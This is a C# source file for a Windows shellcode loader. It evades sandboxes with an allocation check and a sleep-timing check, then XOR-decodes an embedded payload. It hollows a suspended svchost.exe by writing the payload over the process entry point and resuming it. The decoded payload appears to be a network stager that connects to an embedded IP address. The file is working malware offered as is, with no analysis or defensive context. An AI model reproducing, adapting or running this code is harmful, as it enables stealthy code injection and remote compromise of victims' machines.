using System;
using System.Runtime.InteropServices;
namespace holcrimson
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int ProcessBasicInformation = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        public static void Run()
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                return;
            }

            byte[] buf = new byte[587] {
0x9d,0x29,0xe2,0x85,0x91,0x89,0xad,0x61,0x61,0x61,0x20,0x30,0x20,0x31,0x33,
0x30,0x29,0x50,0xb3,0x37,0x04,0x29,0xea,0x33,0x01,0x29,0xea,0x33,0x79,0x29,
0xea,0x33,0x41,0x29,0x6e,0xd6,0x2b,0x2b,0x29,0xea,0x13,0x31,0x2c,0x50,0xa8,
0x29,0x50,0xa1,0xcd,0x5d,0x00,0x1d,0x63,0x4d,0x41,0x20,0xa0,0xa8,0x6c,0x20,
0x60,0xa0,0x83,0x8c,0x33,0x29,0xea,0x33,0x41,0x20,0x30,0xea,0x23,0x5d,0x29,
0x60,0xb1,0x07,0xe0,0x19,0x79,0x6a,0x63,0x6e,0xe4,0x13,0x61,0x61,0x61,0xea,
0xe1,0xe9,0x61,0x61,0x61,0x29,0xe4,0xa1,0x15,0x06,0x29,0x60,0xb1,0x25,0xea,
0x21,0x41,0x28,0x60,0xb1,0xea,0x29,0x79,0x31,0x82,0x37,0x29,0x9e,0xa8,0x20,
0xea,0x55,0xe9,0x2c,0x50,0xa8,0x29,0x60,0xb7,0x29,0x50,0xa1,0x20,0xa0,0xa8,
0x6c,0xcd,0x20,0x60,0xa0,0x59,0x81,0x14,0x90,0x2d,0x62,0x2d,0x45,0x69,0x24,
0x58,0xb0,0x14,0xb9,0x39,0x25,0xea,0x21,0x45,0x28,0x60,0xb1,0x07,0x20,0xea,
0x6d,0x29,0x25,0xea,0x21,0x7d,0x28,0x60,0xb1,0x20,0xea,0x65,0xe9,0x20,0x39,
0x20,0x39,0x29,0x60,0xb1,0x3f,0x38,0x3b,0x20,0x39,0x20,0x38,0x20,0x3b,0x29,
0xe2,0x8d,0x41,0x20,0x33,0x9e,0x81,0x39,0x20,0x38,0x3b,0x29,0xea,0x73,0x88,
0x2a,0x9e,0x9e,0x9e,0x3c,0x29,0x50,0xba,0x32,0x28,0xdf,0x16,0x08,0x0f,0x08,
0x0f,0x04,0x15,0x61,0x20,0x37,0x29,0xe8,0x80,0x28,0xa6,0xa3,0x2d,0x16,0x47,
0x66,0x9e,0xb4,0x32,0x32,0x29,0xe8,0x80,0x32,0x3b,0x2c,0x50,0xa1,0x2c,0x50,
0xa8,0x32,0x32,0x28,0xdb,0x5b,0x37,0x18,0xc6,0x61,0x61,0x61,0x61,0x9e,0xb4,
0x89,0x6e,0x61,0x61,0x61,0x50,0x56,0x53,0x4f,0x53,0x58,0x4f,0x50,0x52,0x51,
0x4f,0x50,0x51,0x52,0x61,0x3b,0x29,0xe8,0xa0,0x28,0xa6,0xa1,0xda,0x60,0x61,
0x61,0x2c,0x50,0xa8,0x32,0x32,0x0b,0x62,0x32,0x28,0xdb,0x36,0xe8,0xfe,0xa7,
0x61,0x61,0x61,0x61,0x9e,0xb4,0x89,0x41,0x61,0x61,0x61,0x4e,0x25,0x33,0x0b,
0x54,0x1b,0x55,0x3b,0x02,0x16,0x37,0x32,0x34,0x59,0x3b,0x39,0x1b,0x58,0x12,
0x39,0x2a,0x4c,0x30,0x03,0x11,0x30,0x0a,0x13,0x0c,0x30,0x39,0x61,0x29,0xe8,
0xa0,0x32,0x3b,0x20,0x39,0x2c,0x50,0xa8,0x32,0x29,0xd9,0x61,0x53,0xc9,0xe5,
0x61,0x61,0x61,0x61,0x31,0x32,0x32,0x28,0xa6,0xa3,0x8a,0x34,0x4f,0x5a,0x9e,
0xb4,0x29,0xe8,0xa7,0x0b,0x6b,0x3e,0x29,0xe8,0x90,0x0b,0x7e,0x3b,0x33,0x09,
0xe1,0x52,0x61,0x61,0x28,0xe8,0x81,0x0b,0x65,0x20,0x38,0x28,0xdb,0x14,0x27,
0xff,0xe7,0x61,0x61,0x61,0x61,0x9e,0xb4,0x2c,0x50,0xa1,0x32,0x3b,0x29,0xe8,
0x90,0x2c,0x50,0xa8,0x2c,0x50,0xa8,0x32,0x32,0x28,0xa6,0xa3,0x4c,0x67,0x79,
0x1a,0x9e,0xb4,0xe4,0xa1,0x14,0x7e,0x29,0xa6,0xa0,0xe9,0x72,0x61,0x61,0x28,
0xdb,0x25,0x91,0x54,0x81,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0x9e,0xae,0x15,
0x63,0x8a,0xcb,0x89,0x34,0x61,0x61,0x61,0x32,0x38,0x0b,0x21,0x3b,0x28,0xe8,
0xb0,0xa0,0x83,0x71,0x28,0xa6,0xa1,0x61,0x71,0x61,0x61,0x28,0xdb,0x39,0xc5,
0x32,0x84,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0xf2,0x32,0x32,0x29,0xe8,0x86,
0x29,0xe8,0x90,0x29,0xe8,0xbb,0x28,0xa6,0xa1,0x61,0x41,0x61,0x61,0x28,0xe8,
0x98,0x28,0xdb,0x73,0xf7,0xe8,0x83,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0xe2,
0xa5,0x41,0xe4,0xa1,0x15,0xd3,0x07,0xea,0x66,0x29,0x60,0xa2,0xe4,0xa1,0x14,
0xb3,0x39,0xa2,0x39,0x0b,0x61,0x38,0xda,0x81,0x7c,0x4b,0x6b,0x20,0xe8,0xbb,
0x9e,0xb4 };


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] baseAddressBytes = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;
            uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}